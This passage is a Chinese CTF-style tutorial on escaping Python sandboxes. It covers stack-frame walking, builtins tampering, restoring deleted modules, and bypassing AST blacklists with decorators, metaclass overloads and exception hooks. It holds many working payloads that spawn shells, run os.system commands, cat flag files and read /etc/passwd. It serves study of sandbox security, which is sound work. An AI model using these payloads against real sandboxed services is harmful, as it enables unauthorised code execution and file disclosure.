<p>在 Python 中，生成器可以使用 yield 关键字来定义。yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">f</span>():
    a=<span class="number">1</span>
    <span class="keyword">while</span> <span class="literal">True</span>:
        <span class="keyword">yield</span> a
        a+=<span class="number">1</span>
f=f()
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#1</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#2</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#3</span>
<span class="built_in">next</span>() 函数在Python中用于获取迭代器的下一个元素

<span class="comment">#生成器表达式:</span>
 gen_exp = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))

 <span class="keyword">for</span> num <span class="keyword">in</span> gen_exp:
     <span class="built_in">print</span>(num)
<span class="comment">#类似于列表推导式，但使用小括号 () 而不是方括号 [] 来创建生成器表达式</span></code></pre>
<p><strong>生成器属性</strong></p>
<p><code>gi_code</code>: 生成器对应的code对象。<br>
<code>gi_frame</code>: 生成器对应的frame（栈帧）对象。<br>
<code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br>
<code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br>
<code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
<p><strong>着重介绍一下 gi_frame 属性</strong><br>
<code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p>
<p>下面是一个简单的示例，演示了如何使用生成器的 gi_frame 属性来获取生成器的当前帧信息:</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">my_generator</span>():
    <span class="keyword">yield</span> <span class="number">1</span>
    <span class="keyword">yield</span> <span class="number">2</span>
    <span class="keyword">yield</span> <span class="number">3</span>

gen = my_generator()

<span class="comment"># 获取生成器的当前帧信息</span>
frame = gen.gi_frame

<span class="comment"># 输出生成器的当前帧信息</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)
<span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)
<span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)
<span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</code></pre>
<p><strong>栈帧(frame)</strong></p>
<p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
<p>栈帧包含了以下几个重要的属性：<br>
<code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br>
<code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br>
<code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br>
<code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br>
<code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈</p>
<h4 id="生成器栈帧逃逸"><a class="markdownIt-Anchor" href="#生成器栈帧逃逸"></a> <strong>生成器栈帧逃逸</strong></h4>
<p>原理其实就是生成器的栈帧对象通过<code>f_back</code>不断返回前一帧从而去获取<code>globals</code>全局符号表</p>
<pre><code class="highlight python">s3cret=<span class="string">&quot;this is flag&quot;</span>
<span class="keyword">def</span> <span class="title function_">f</span>():
        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back

g = f().gi_frame  <span class="comment">#生成器</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, g.f_globals)</code></pre>
<p>在这里其实就可以看到成功逃出</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102803052.png" alt="image-20250506102803052"></p>
<p>而查看locals时就会发现是空列表</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102848722.png" alt="image-20250506102848722"></p>
<p>模拟一下沙箱的操作</p>
<pre><code class="highlight python">codes=<span class="string">&#x27;&#x27;&#x27;</span>
<span class="string">def waff():</span>
<span class="string">    def f():</span>
<span class="string">        yield g.gi_frame.f_back</span>
<span class="string"></span>
<span class="string">    g = f()  #生成器</span>
<span class="string">    frame = next(g) #获取到生成器的栈帧对象</span>
<span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span>
<span class="string">    return b</span>
<span class="string">b=waff()</span>
<span class="string">&#x27;&#x27;&#x27;</span>
<span class="built_in">locals</span>=&#123;&#125;
code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)
<span class="built_in">exec</span>(code,<span class="built_in">locals</span>)
<span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])
<span class="comment">#使用next获取到的就是yield定义的值，这里获取到的就是g.gi_frame.f_back</span>
<span class="comment">#使用g.gi_frame.f_back的话，那么g = f()就必须为g，用的就是这个生成器对象的栈帧</span>
<span class="comment">#compile(codes, &quot;test&quot;, &quot;exec&quot;)就是设置了名称为test的python沙箱环境</span></code></pre>
<p>运行得到 <code>this is flag</code> ,成功逃逸出沙箱获取到<code>s3cret</code>变量值</p>
<p>这里也可以使用<code>f_locals</code>去代替<code>f_globals</code>效果是相同的，但是要注意，<code>locals</code>返回的是局部符号表，它包含了在当前函数或方法内部定义的变量。这些局部变量只在当前函数或方法的执行过程中存在，并且只能在该函数或方法内部访问。当函数执行完毕后，这些局部变量就会被销毁。</p>
<p>怎么用呢，可以用来配合修改函数；也可以拿<code>_globals</code>反打rce</p>
<pre><code class="highlight plaintext">2024L3HCTF 打int函数返回值 参考链接:https://xz.aliyun.com/news/13075</code></pre>
<h4 id="异常栈帧逃逸"><a class="markdownIt-Anchor" href="#异常栈帧逃逸"></a> <strong>异常栈帧逃逸</strong></h4>
<p>通过主动抛出异常+抓抛出错误的栈帧来逃逸沙箱</p>
<p>给一串简单的实例:</p>
<pre><code class="highlight python"><span class="keyword">try</span>:
    <span class="number">1</span>/<span class="number">0</span>
<span class="keyword">except</span> Exception <span class="keyword">as</span> e:
    frame=e.__traceback__.tb_frame
    builtins=frame.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]
    builtins.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250603194452776.png" alt="image-20250603194452776"></p>
<p>可以看到成功执行了。</p>
<h4 id="异步栈帧逃逸"><a class="markdownIt-Anchor" href="#异步栈帧逃逸"></a> 异步栈帧逃逸</h4>
<pre><code class="highlight python"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">a</span>():
    <span class="keyword">pass</span>
a().cr_frame.f_globals</code></pre>
<h3 id="变量覆盖与函数篡改"><a class="markdownIt-Anchor" href="#变量覆盖与函数篡改"></a> 变量覆盖与函数篡改</h3>
<p>优雅啊，很优雅啊。。</p>
<p>这里简单一些的就是给出blacklist但是是可控的，可以直接改变量然后直接执行命令就可以了</p>
<p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p>
<p>sys.modules 存放了现有模块的引用, 通过访问 <code>sys.modules['__main__']</code> 就可以访问当当前模块定义的所有函数以及全局变量</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; aaa = &#x27;bbb&#x27;
&gt;&gt;&gt; def my_input():
...     dict_global = dict()
...     while True:
...       try:
...           input_data = input(&quot;&gt; &quot;)
...       except EOFError:
...           print()
...           break
...       except KeyboardInterrupt:
...           print(&#x27;bye~~&#x27;)
...           continue
...       if input_data == &#x27;&#x27;:
...           continue
...       try:
...           complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)
...       except SyntaxError as err:
...           print(err)
...           continue
...       try:
...           exec(complie_code, dict_global)
...       except Exception as err:
...           print(err)
... 
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;]
&lt;module &#x27;__main__&#x27; (built-in)&gt;
&gt;&gt;&gt; dir(sys.modules[&#x27;__main__&#x27;])
[&#x27;__annotations__&#x27;, &#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;aaa&#x27;, &#x27;my_input&#x27;, &#x27;sys&#x27;]
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;].aaa
&#x27;bbb&#x27;</code></pre>
<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 <code>__builtins__</code>篡改内置函数等,这只是一个思路.</p>
<p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p>
<h4 id="利用-gc-获取已删除模块"><a class="markdownIt-Anchor" href="#利用-gc-获取已删除模块"></a> 利用 gc 获取已删除模块</h4>
<p>这个思路来源于 <a href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano – github</a></p>
<p>这道题的目标是覆盖 <code>__main__</code> 中的 <code>__exit</code> 函数,但是题目将 <code>sys.modules['__main__']</code> 删除了,无法直接获取.</p>
<pre><code class="highlight plaintext">for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]</code></pre>
<p><code>gc</code> 是Python的内置模块，全名为”garbage collector”，中文译为”垃圾回收”。<code>gc</code> 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。<code>gc</code> 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 <code>gc</code> 模块中的主要函数：</p>
<ol>
<li><code>gc.collect(generation=2)</code>：这个函数会立即触发一次垃圾回收。你可以通过 <code>generation</code> 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</li>
<li><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</li>
<li><code>gc.get_referrers(*objs)</code>：这个函数会返回指向 <code>objs</code> 中任何一个对象的对象列表。</li>
</ol>
<p>exp 如下</p>
<pre><code class="highlight plaintext">for obj in gc.get_objects():
    if &#x27;__name__&#x27; in dir(obj):
        if &#x27;__main__&#x27; in obj.__name__:
            print(&#x27;Found module __main__&#x27;)
            mod_main = obj
        if &#x27;os&#x27; == obj.__name__:
            print(&#x27;Found module os&#x27;)
            mod_os = obj
mod_main.__exit = lambda x : print(&quot;[+] bypass&quot;)</code></pre>
<p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p>
<h4 id="利用-traceback-获取模块"><a class="markdownIt-Anchor" href="#利用-traceback-获取模块"></a> 利用 traceback 获取模块</h4>
<p>这个思路来源于 <a href="https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md">writeup by hstocks – github</a></p>
<p>主动抛出异常, 并获取其后要执行的代码, 然后将<code>__exit</code> 进行替换, 思路也是十分巧妙.</p>
<pre><code class="highlight plaintext">try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # has a reference to the audit function
    while nxt_frame:
        if &#x27;audit&#x27; in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals[&#x27;__exit&#x27;] = print

    # Now we&#x27;re free to call whatever we want
    os.system(&#x27;cat /flag*&#x27;)</code></pre>
<p>但是实际测试时使用 python 3.11 发现 <code>nxt_frame = tb.tb_frame</code> 会触发 <code>object.__getattr__</code> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 python 3.9 (题目版本)中适用</p>
<h3 id="模块重载原module被篡改"><a class="markdownIt-Anchor" href="#模块重载原module被篡改"></a> 模块重载(原module被篡改)</h3>
<p>为什么要<strong>重载</strong>呢？因为目标模块/方法在一开始就被<strong>删除/覆盖</strong>了，但是通过一些手段，就可以重新加载这些模块</p>
<pre><code class="highlight bash">&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&lt;built-in <span class="keyword">function</span> <span class="built_in">eval</span>&gt;
&gt;&gt;&gt; del __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
Traceback (most recent call last):
  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;
KeyError: <span class="string">&#x27;eval&#x27;</span></code></pre>
<h4 id="reload-重新加载"><a class="markdownIt-Anchor" href="#reload-重新加载"></a> reload 重新加载</h4>
<p>reload函数在不同版本中的位置不同</p>
<pre><code class="highlight plaintext">Python 2.x
&gt;&gt;&gt;reload(module)

Python 2.x-3.3
&gt;&gt;&gt;import imp
&gt;&gt;&gt;impo.reload(module)

Python 3.4-latest
&gt;&gt;&gt;import importlib
&gt;&gt;&gt;importlib.reload(module)</code></pre>
<p>reload 函数可以重新加载模块，这样被删除的函数能被重新加载</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;
&gt;&gt;&gt; del __builtins__.__dict__[&#x27;eval&#x27;]
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;
&gt;&gt;&gt; reload(__builtins__)
&lt;module &#x27;__builtin__&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;</code></pre>
<p>在 Python 3 中，reload() 函数被移动到 <code>importlib</code> 模块中，所以如果要使用 reload() 函数，需要先导入<code> importlib</code> 模块。</p>
<p>貌似新版本的 python 即使运行了<code> importlib.reload</code> 也无法恢复了。</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; importlib.reload(__builtins__)
&lt;module &#x27;builtins&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;</code></pre>
<h4 id="恢复-sysmodules"><a class="markdownIt-Anchor" href="#恢复-sysmodules"></a> 恢复 <code>sys.modules</code></h4>
<p>一些过滤中可能将 <code>sys.modules['os']</code> 进行修改. 这个时候即使将 <code>os</code> 模块导入进来,也是无法使用的.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;
&gt;&gt;&gt; __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</code></pre>
<p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __import__(&#x27;subprocess&#x27;).Popen(&#x27;whoami&#x27;, shell=True)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 688, in &lt;module&gt;
    class Popen(object):
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 1708, in Popen
    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
AttributeError: &#x27;str&#x27; object has no attribute &#x27;WIFSIGNALED&#x27;</code></pre>
<p>由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可.</p>
<pre><code class="highlight plaintext">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27; # oj 为你加的

del sys.modules[&#x27;os&#x27;]
import os
os.system(&#x27;ls&#x27;)</code></pre>
<h4 id="globals"><a class="markdownIt-Anchor" href="#globals"></a> globals()</h4>
<p>有些时候沙箱会设置</p>
<pre><code class="highlight plaintext">def blacklist_fun_callback(*args):
    print(&quot;Player! It&#x27;s already banned!&quot;)

vars = blacklist_fun_callback
attr = blacklist_fun_callback
dir = blacklist_fun_callback
getattr = blacklist_fun_callback
exec = blacklist_fun_callback
__import__ = blacklist_fun_callback
compile = blacklist_fun_callback</code></pre>
<p>来覆盖内置函数，限制函数的使用。</p>
<p>但是<code>builtins</code>是一个不可变的模块对象，这样修改仅能够在当前的作用域中生效，而 globals() 中存放了 builtins 模块的索引，因此可以通过下面的方式获取到原始的方法。</p>
<pre><code class="highlight plaintext">globals()[&quot;__builtins__&quot;][&#x27;breakpoint&#x27;]</code></pre>
<p>但是题目如果使用了下面的方式来删除，那就没有办法了，即使 reload 重新导入 <code>builtins</code> 模块，较新版本的 python 中也无法恢复。</p>
<pre><code class="highlight plaintext">del globals()[&quot;__builtins__&quot;].breakpoint</code></pre>
<h3 id="ast"><a class="markdownIt-Anchor" href="#ast"></a> AST</h3>
<p>AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 <code>ast.Import|ast.ImportFrom|ast.Call</code> 这三类操作, 这样一来就无法导入模块和执行函数.</p>
<pre><code class="highlight plaintext">import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print(&quot;-- Please enter code (last line must contain only --END)&quot;)
source_code = &quot;&quot;
while True:
  line = sys.stdin.readline()
  if line.startswith(&quot;--END&quot;):
    break
  source_code += line

tree = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print(&quot;-- Executing safe code:&quot;)
  compiled = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;)
  exec(compiled)</code></pre>
<p>下面的 without call 来源于 hacktricks</p>
<h4 id="without-call"><a class="markdownIt-Anchor" href="#without-call"></a> without call</h4>
<p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p>
<h5 id="装饰器"><a class="markdownIt-Anchor" href="#装饰器"></a> <strong>装饰器</strong></h5>
<p>利用 payload 如下，乍一看可能有些迷惑，但该 payload 实际上等效于 exec(input(X))</p>
<pre><code class="highlight plaintext">@exec
@input
class X:
    pass</code></pre>
<p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; @exec
... @input
... class X:
...     pass
... 
&lt;class &#x27;__main__.X&#x27;&gt;__import__(&quot;os&quot;).system(&quot;ls&quot;)</code></pre>
<p>由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.</p>
<p>其实这样的话,构造其实可以有很多,比如使用单层的装饰器，打开 help 函数.</p>
<pre><code class="highlight plaintext">@help
class X:
    pass</code></pre>
<p>这样可以直接进入帮助文档:</p>
<pre><code class="highlight plaintext">Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)</code></pre>
<p>再次输入 !sh 即可打开 /bin/sh</p>
<p>或是给装饰器加一些参数。</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@getattr(os,&quot;system&quot;)
@fake_wrapper
def something():
  pass</code></pre>
<p>相当于：</p>
<pre><code class="highlight plaintext">getattr(os,&quot;system&quot;)(fake_wrapper(something))</code></pre>
<p>亦或者自定义一个装饰器：</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@os.system
@fake_wrapper
def something():
  pass</code></pre>
<p>相当于 <code>os.system(fake_wrapper(something))</code>，也就是 <code>os.system(‘/bin/sh’)</code></p>
<h5 id="函数覆盖"><a class="markdownIt-Anchor" href="#函数覆盖"></a> <strong>函数覆盖</strong></h5>
<p>我们知道在 Python 中获取一个的属性例如 <code>obj[argument]</code> 实际上是调用的 <code>obj.__getitem__</code> 方法.因此只需要覆盖其 <code>__getitem__</code> 方法, 即可在使用 <code>obj[argument]</code> 执行代码:</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; class A:
...     __getitem__ = exec
... 
&gt;&gt;&gt; A()[&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;]</code></pre>
<p>但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 <code>ast.Call</code>. 如何在不执行构造函数的情况下获取类实例呢?</p>
<p><strong><code>metaclass</code> 利用</strong></p>
<p>Python 中提供了一种元类(<code>metaclass</code>)概念。元类是创建类的“类”。在 Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p>
<p>元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p>
<p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __getitem__ = exec 
    
class Sub(metaclass=Metaclass):
    pass

Sub[&#x27;import os; os.system(&quot;sh&quot;)&#x27;]</code></pre>
<p>除了 <code>__getitem__</code> 之外其他方法的利用方式如下:</p>
<pre><code class="highlight plaintext">__sub__ (k - &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mul__ (k * &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__floordiv__ (k // &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__truediv__ (k / &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mod__ (k % &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__pow__ (k**&#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__lt__ (k &lt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__le__ (k &lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__eq__ (k == &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ne__ (k != &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ge__ (k &gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__gt__ (k &gt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iadd__ (k += &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__isub__ (k -= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__imul__ (k *= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ifloordiv__ (k //= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__idiv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__itruediv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;) (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ipow__ (k **= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ilshift__ (k&lt;&lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__irshift__ (k &gt;&gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iand__ (k = &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ior__ (k |= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ixor__ (k ^= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</code></pre>
<p>示例:</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __sub__ = exec
    
class Sub(metaclass=Metaclass):
    pass

Sub-&#x27;import os; os.system(&quot;sh&quot;)&#x27;</code></pre>
<p><strong>exceptions 利用</strong></p>
<p>利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:</p>
<pre><code class="highlight plaintext">class RCE(Exception):
    def __init__(self):
        self += &#x27;import os; os.system(&quot;sh&quot;)&#x27;
    __iadd__ = exec 
    
raise RCE</code></pre>
<p>raise 会进入 RCE 的 <code>__init__</code>, 然后触发 <code>__iadd__</code> 也就是 exec.</p>
<p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p>
<pre><code class="highlight plaintext">class X:
    def __init__(self, a, b, c):
        self += &quot;os.system(&#x27;sh&#x27;)&quot;
    __iadd__ = exec
sys.excepthook = X
1/0</code></pre>
<p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p>
<pre><code class="highlight plaintext">class X():
  def __init__(self, a, b, c, d, e):
    self += &quot;print(open(&#x27;flag&#x27;).read())&quot;
  __iadd__ = eval
__builtins__.__import__ = X
&#123;&#125;[1337]</code></pre>
<p>这个 payload 将 <code>__import__</code> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <code>__import__</code>.</p>
<h5 id="通过-license-函数读取文件"><a class="markdownIt-Anchor" href="#通过-license-函数读取文件"></a> 通过 license 函数读取文件</h5>
<pre><code class="highlight plaintext">__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>
<p>上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用 <code>license()</code> 时会打印这个文件的内容.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&quot;license&quot;]._Printer__filenames
[&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/../LICENSE&#x27;, &#x27;/usr/lib/python3.11/LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/LICENSE&#x27;, &#x27;./LICENSE.txt&#x27;, &#x27;./LICENSE&#x27;]</code></pre>
<p>payload 中将 help 类的 <code>__enter__</code> 方法覆盖为 <code>license</code> 方法, 而 with 语句在创建上下文时会调用 help 的<code>__enter__</code>, 从而执行 <code>license</code> 方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的. 例如:</p>
<pre><code class="highlight plaintext">class MyContext:
    pass
    
__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = MyContext()
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>
<h4 id="打印-ast"><a class="markdownIt-Anchor" href="#打印-ast"></a> 打印 AST</h4>
<pre><code class="highlight plaintext">import os
import ast 

BAD_ATS = &#123;
  ast.Attribute,
  ast.AST,
  ast.Subscript,
  ast.comprehension,
  ast.Delete,
  ast.Try,
  ast.For,
  ast.ExceptHandler,
  ast.With,
  ast.Import,
  ast.ImportFrom,
  ast.Assign,
  ast.AnnAssign,
  ast.Constant,
  ast.ClassDef,
  ast.AsyncFunctionDef,
&#125;

a = &#x27;&#x27;&#x27;
[
    system:=111,
    bash:=222
]
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))


for x in ast.walk(compile(a, &quot;&lt;QWB7th&gt;&quot;, &quot;exec&quot;, flags=ast.PyCF_ONLY_AST)):
  if type(x) in BAD_ATS:
    print(type(x))
    exit()

print(&quot;[+] OK&quot;)</code></pre>
<h4 id="绕过-astattribute-获取属性"><a class="markdownIt-Anchor" href="#绕过-astattribute-获取属性"></a> 绕过 ast.Attribute 获取属性</h4>
<p>如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。</p>
<p>最简单的示例，匹配字符串：</p>
<pre><code class="highlight plaintext">item = 2

match item:
    case 1:
        print(&quot;One&quot;)
    case 2:
        print(&quot;Two&quot;)

# Two</code></pre>
<p>还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。</p>
<pre><code class="highlight plaintext">item = (1, 2)

match item:
    case (x, y, z):
        print(f&quot;&#123;x&#125; &#123;y&#125; &#123;z&#125;&quot;)
    case (x, y):
        print(f&quot;&#123;x&#125; &#123;y&#125;&quot;)
    case (x,):
        print(f&quot;&#123;x&#125;&quot;)</code></pre>
<p>对于基本类型的匹配比较好理解，下面是一个匹配类的示例：</p>
